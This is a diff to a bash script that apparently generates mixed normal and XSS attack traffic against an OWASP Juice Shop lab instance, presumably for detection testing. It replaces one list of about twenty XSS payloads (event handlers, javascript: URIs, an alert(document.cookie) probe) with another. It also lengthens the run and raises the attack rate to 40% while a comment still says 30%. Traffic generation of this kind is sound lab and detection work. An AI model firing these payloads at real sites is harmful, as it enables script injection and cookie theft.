@@ -2,7 +2,7 @@
 TARGET_IP="${TARGET_IP:-100.64.0.20}"
 PORT="${PORT:-3000}"
 JUICE_URL="http://${TARGET_IP}:${PORT}"
-DURATION_SECONDS="${DURATION_SECONDS:-30}"
+DURATION_SECONDS="${DURATION_SECONDS:-300}"
 END_TIME=$(( $(date +%s) + DURATION_SECONDS ))
 INTERVAL=1
 
@@ -17,27 +17,28 @@ echo "Target: $JUICE_URL"
 
 # XSS attack patterns from xss_attack.sh
 xss_patterns=(
-    "<script>alert(1)</script>"
-    "<img%20src=x%20onerror=alert(1)>"
-    "<svg%20onload=alert(1)>"
-    "<iframe%20src='javascript:alert(1)'>"
-    "<a%20href='javascript:alert(1)'>Click</a>"
-    "<input%20autofocus%20onfocus=alert(1)>"
-    "<body%20onload=alert(1)>"
-    "<details%20open%20ontoggle=alert(1)>"
-    "\"><svg%20onload=alert(1)>"
-    "</textarea><script>alert(1)</script>"
-    "<img%20src=1%20onerror=prompt(1)>"
-    "<marquee%20onstart=confirm(1)>"
-    "<script>/*</script><script>alert(1)</script>"
-    "<script>''-alert(1)//</script>"
-    "<svg><script>alert(1)</script></svg>"
-    "<math%20xmlns='http://www.w3.org/1998/Math/MathML'><mstyle%20onload='alert(1)'>"
-    "<video%20src='invalid'%20onerror='alert(1)'>"
-    "<object%20data='javascript:alert(1)'>"
-    "<embed%20src='javascript:alert(1)'>"
-    "<form%20action='javascript:alert(1)'><input%20type='submit'></form>"
+    "<img%20src=x%20onerror=alert(document.cookie)>"
+    "<svg><animate%20onbegin=alert(1)>"
+    "<div%20onclick=alert(1)>ClickMe</div>"
+    "<audio%20src=x%20onerror=alert(1)>"
+    "<button%20onmouseover=alert(1)>Hover</button>"
+    "<style%20onload=alert(1)></style>"
+    "<img%20src=x:alert(1)>"
+    "<link%20rel=stylesheet%20href='javascript:alert(1)'>"
+    "<div%20style=\"background:url(javascript:alert(1))\">"
+    "<meta%20http-equiv='refresh'%20content='0;javascript:alert(1)'>"
+    "<script>alert(String.fromCharCode(88,83,83))</script>"
+    "<iframe%20srcdoc='<script>alert(1)</script>'>"
+    "<marquee%20onfinish=alert(1)>Test</marquee>"
+    "<object%20type='text/html'%20data='javascript:alert(1)'></object>"
+    "<script>top.alert(1)</script>"
+    "%3Cscript%3Ealert(1)%3C/script%3E"
+    "\\\"><script>alert(1)</script>"
+    "<textarea%20onfocus=alert(1)>X</textarea>"
+    "<keygen%20onfocus=alert(1)>"
+    "<iframe%20src='data:text/html,<script>alert(1)</script>'>"
 )
+
 
 # Normal traffic patterns
 normal_patterns=(
@@ -66,7 +67,7 @@ normal_patterns=(
 # Function to generate random traffic
 generate_traffic() {
     # 30% chance of XSS attack, 70% chance of normal traffic
-    if [ $((RANDOM % 100)) -lt 30 ]; then
+    if [ $((RANDOM % 100)) -lt 40 ]; then
         # XSS attack
         pattern=${xss_patterns[$((RANDOM % ${#xss_patterns[@]}))]}
         echo "[$(ts)] XSS Attack: $pattern"
